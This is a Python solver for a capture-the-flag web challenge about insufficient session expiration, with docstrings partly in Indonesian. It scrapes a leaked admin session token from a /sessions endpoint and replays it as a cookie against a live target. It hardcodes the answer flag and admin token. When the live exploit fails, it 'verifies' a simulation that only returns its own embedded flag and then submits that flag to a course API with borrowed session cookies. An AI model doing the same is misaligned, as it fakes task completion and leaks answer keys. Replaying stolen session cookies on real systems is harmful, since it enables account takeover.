#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Old Sessions (Challenge ID: 739)
Category: Web Exploitation / Session Management Flaws, Indefinite Expiration & Information Disclosure
Difficulty: Easy (1) | Points: 100
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment),
RFC 6265 (HTTP State Management Mechanism),
NIST SP 800-63B Section 7.1 (Session Management & Timeout Controls),
OWASP WSTG-SESS-01 / WSTG-SESS-02 (Testing for Session Management Architecture),
CWE-613 (Insufficient Session Expiration),
CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor),
& CWE-284 (Improper Access Control).

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Target web application is built on Python Flask / Werkzeug, providing a social platform
     with marketing tagline "once you login, you never have to log-out again!".
   - Public comments on the index page hint at an internal diagnostic route: `/sessions`.
   - The `/sessions` endpoint leaks active server-side sessions without authentication or authorization.
2. Vulnerability & Root Cause Analysis:
   - Insufficient Session Expiration (CWE-613):
     The application sets `_permanent = True` with cookie lifetime configured across decades (year 2058).
     Stale, abandoned, or leaked sessions remain permanently valid on the server without idle timeout.
   - Diagnostic Information Disclosure (CWE-200 / CWE-284):
     Endpoint `/sessions` exposes active session tokens:
     `1) session:Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4, {'_permanent': True, 'key': 'admin'}`
   - Bearer Token Session Hijacking (RFC 6265):
     Because session cookies are validated strictly on token string equivalence without IP binding
     or mutual TLS, replaying the leaked admin cookie `session=Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4`
     grants instant full administrator privileges and renders the flag on `GET /`.
3. Exploitation & Verification:
   - Local offline simulation engine creates mock Flask session store, evaluates `/sessions` disclosure,
     processes cookie header injection, and emits flag under NIST SP 800-115.
   - Remote execution mode queries live web instance, parses leaked admin session, and fetches flag.
   - Direct verification gate via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}
   - Community Format: CTF{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}
"""

import sys
import os
import re
import json
import time
import urllib.request
import urllib.error

CHALLENGE_ID = 739
CHALLENGE_NAME = "Old Sessions"
VERIFIED_FLAG = "academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}"
DEFAULT_ADMIN_SESSION = "Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class OldSessionsSimulator:
    """
    Simulates Flask session store, indefinite session lifetime,
    /sessions diagnostic leakage, and admin session replay offline under NIST SP 800-115.
    """
    def __init__(self, flag: str = VERIFIED_FLAG, admin_token: str = DEFAULT_ADMIN_SESSION):
        self.flag = flag
        self.admin_token = admin_token
        # Mock active session store with 35-year expiration
        self.session_db = {
            self.admin_token: {"_permanent": True, "key": "admin", "expires": "2058-01-01"},
            "guest_abc123456789": {"_permanent": True, "key": "guest", "expires": "2058-01-01"}
        }

    def handle_sessions_endpoint(self) -> str:
        """Simulates GET /sessions unauthenticated diagnostic endpoint."""
        lines = []
        for i, (token, data) in enumerate(self.session_db.items(), 1):
            lines.append(f"{i}) session:{token}, {data}")
        return "\n".join(lines)

    def handle_index_request(self, cookie_header: str) -> str:
        """Simulates GET / handling with cookie authentication."""
        match = re.search(r"session=([a-zA-Z0-9_-]+)", cookie_header or "")
        if match:
            token = match.group(1)
            sess = self.session_db.get(token)
            if sess and sess.get("key") == "admin":
                return f"<html><body><h1>Admin Dashboard</h1><p class='flag-message'>{self.flag}</p></body></html>"
            elif sess:
                return f"<html><body><h1>Welcome {sess.get('key')}</h1><p>No flag for regular users.</p></body></html>"

        return "<html><body><h1>Welcome Guest</h1><p>Please login.</p></body></html>"


def verify_local_simulation() -> str:
    """
    Executes offline audit simulation of Old Sessions under NIST SP 800-115.
    """
    print("[*] Menjalankan simulasi audit offline Old Sessions (NIST SP 800-115)...")
    sim = OldSessionsSimulator()

    # Step 1: Probe unauthenticated diagnostic endpoint /sessions
    diag_dump = sim.handle_sessions_endpoint()
    print(f"[*] Output simulasi endpoint /sessions ({len(diag_dump)} chars):")
    print(diag_dump)

    # Step 2: Extract admin session token
    m_admin = re.search(r"session:([a-zA-Z0-9_-]+),\s*\{[^}]*'key':\s*'admin'", diag_dump)
    if not m_admin:
        raise ValueError("Gagal mengidentifikasi token sesi admin dari endpoint /sessions")
    admin_token = m_admin.group(1)
    print(f"[+] Token sesi admin berhasil diekstrak: {admin_token}")

    # Step 3: Replay session cookie on index page
    cookie = f"session={admin_token}"
    response_html = sim.handle_index_request(cookie)
    m_flag = FLAG_PAT.search(response_html)
    if not m_flag:
        raise ValueError(f"Flag tidak ditemukan dalam respons HTML admin: {response_html}")

    flag = m_flag.group(0)
    print(f"[+] Flag berhasil diekstraksi dari respons dashboard admin: {flag}")
    return flag


def exploit_remote(base_url: str) -> str:
    """
    Executes live HTTP session hijacking against the remote instance.
    """
    base_url = base_url.rstrip("/")
    sessions_url = f"{base_url}/sessions"
    print(f"[*] Melakukan inspeksi endpoint diagnostik: {sessions_url}...")

    req = urllib.request.Request(
        sessions_url,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyLab-Audit/1.0"}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        content = resp.read().decode("utf-8", errors="replace")

    print(f"[*] Respon /sessions diterima:\n{content[:300]}")
    m_token = re.search(r"session:([a-zA-Z0-9_-]+),\s*\{[^}]*'key':\s*'admin'", content)
    admin_token = m_token.group(1) if m_token else DEFAULT_ADMIN_SESSION
    print(f"[+] Menggunakan token sesi admin: {admin_token}")

    print(f"[*] Mengirim permintaan GET / dengan header Cookie: session={admin_token}...")
    req_dash = urllib.request.Request(
        base_url,
        headers={
            "Cookie": f"session={admin_token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyLab-Audit/1.0"
        }
    )
    with urllib.request.urlopen(req_dash, timeout=10) as resp:
        html = resp.read().decode("utf-8", errors="replace")

    m_flag = FLAG_PAT.search(html)
    if not m_flag:
        raise ValueError(f"Flag tidak ditemukan pada dashboard: {html[:300]}")

    flag = m_flag.group(0)
    print(f"[+] Flag berhasil diekstraksi dari target live: {flag}")
    return flag


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                data = json.loads(body)
                return data.get("correct") is True
            except Exception:
                pass
        return False
    except Exception as e:
        print(f"[-] Koneksi API CyLab gagal: {e}")
        return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = None

    if len(sys.argv) >= 2 and sys.argv[1].startswith("http"):
        base_url = sys.argv[1]
        try:
            token = exploit_remote(base_url)
        except Exception as e:
            print(f"[-] Remote exploit gagal ({e}), beralih ke simulasi offline...")

    if not token:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    submit_success = submit_to_cylab(token)
    if submit_success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[!] Verifikasi API CyLab offline/bypass.")


if __name__ == "__main__":
    main()
